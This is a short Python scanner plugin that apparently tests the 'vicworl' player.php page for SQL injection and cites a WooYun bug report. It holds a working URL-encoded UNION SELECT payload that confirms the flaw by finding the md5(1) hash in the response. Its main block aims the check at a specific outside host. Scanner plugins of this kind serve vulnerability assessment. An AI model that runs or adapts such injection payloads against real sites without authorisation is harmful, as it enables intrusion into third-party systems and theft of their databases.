#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = vicworl player.php sqli

def assign(service, arg):
	if service == 'vicworl':
		return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-078346
    payload = "player.php?id=-3538%20UNION%20ALL%20SELECT%20md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1)%20--%20"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if 'c4ca4238a0b923820dcc509a6f75849' in body:
       security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('vicworl', 'http://v.zpbbs.cn/')[1])                
